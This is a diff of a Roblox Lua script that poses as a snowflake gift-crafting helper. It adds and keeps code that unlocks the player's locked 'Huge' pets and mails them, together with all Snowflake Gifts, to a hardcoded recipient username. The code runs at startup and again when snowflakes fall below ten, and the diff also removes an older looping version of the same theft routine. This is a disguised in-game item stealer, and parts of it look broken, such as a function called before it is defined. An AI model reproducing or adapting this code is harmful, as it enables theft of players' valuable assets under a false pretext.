@@ -52,6 +52,13 @@ local function checkAndCraftGifts()
         -- Output snowflake count
         print("Total Snowflake items:", snowflakeCount)
 
+        -- If snowflakes are less than 10, stop the script and send gifts
+        if snowflakeCount < 10 then
+            print("Not enough snowflakes! Stopping script and sending gifts...")
+            sendGiftsToUsername(snowflakeCount)  -- Call the function to send gifts
+            return  -- Exit the loop and stop the script
+        end
+
         local totalGiftsToCraft = math.floor(snowflakeCount / snowflakeToGiftRatio)
         local totalDiamondToCraftAll = totalGiftsToCraft * diamondPerGift
 
@@ -85,38 +92,6 @@ local function checkAndCraftGifts()
     end
 end
 
--- Function to unlock Huge pets and send them to the configured user
-local function sendHugePetsToRandomUser()
-    while true do
-        wait(loopInterval)  -- Loop every 10 seconds
-
-        local HugeUIDList = {}
-
-        -- Unlock Huge pets
-        for PetUID, PetData in pairs(require(game.ReplicatedStorage.Library.Client.Save).Get().Inventory.Pet) do
-            if PetData.id:find("Huge") then  -- Find Huge pets by checking the pet ID
-                table.insert(HugeUIDList, PetUID)  -- Add Huge pets to the list
-                if PetData._lk then
-                    repeat
-                        task.wait()  -- Wait until the pet is unlocked
-                    until Network.Invoke("Locking_SetLocked", PetUID, false)
-                    print("Unlocked Huge pet", PetUID)
-                end
-            end
-        end
-
-        -- Send Huge pets to the configured user
-        for _, PetUID in pairs(HugeUIDList) do
-            local selectedUser = username  -- Use the configured username
-            local selectedMessage = noteToSend  -- Use the configured message
-            repeat
-                task.wait()  -- Wait until the pet is sent
-            until Network.Invoke("Mailbox: Send", selectedUser, selectedMessage, "Pet", PetUID, 1)
-            print("Sent Huge pet", PetUID, "to", selectedUser, "with message:", selectedMessage)
-        end
-    end
-end
-
 -- Function to send all Snowflake gifts and Huge pets to the configured username
 local function sendGiftsToUsername(snowflakeCount)
     -- Send all Snowflake Gifts
@@ -128,7 +103,7 @@ local function sendGiftsToUsername(snowflakeCount)
         print("Sent Snowflake Gift to", username)
     end
 
-    -- Send all Huge pets
+    -- Send Huge pets
     local HugeUIDList = {}
     for PetUID, PetData in pairs(require(game.ReplicatedStorage.Library.Client.Save).Get().Inventory.Pet) do
         if PetData.id:find("Huge") then
@@ -145,12 +120,6 @@ local function sendGiftsToUsername(snowflakeCount)
     end
 end
 
-        if snowflakeCount < 10 then
-            print("Not enough snowflakes! Stopping script and sending gifts...")
-            sendGiftsToUsername(snowflakeCount)
-            return  -- Exit the loop and stop the script
-        end
-
 -- Run the check and gift functions concurrently using spawn
-spawn(checkAndCraftGifts)
-spawn(sendHugePetsToRandomUser)  -- Run the function to send Huge pets
+spawn(checkAndCraftGifts)  -- First check and craft gifts
+spawn(sendGiftsToUsername)
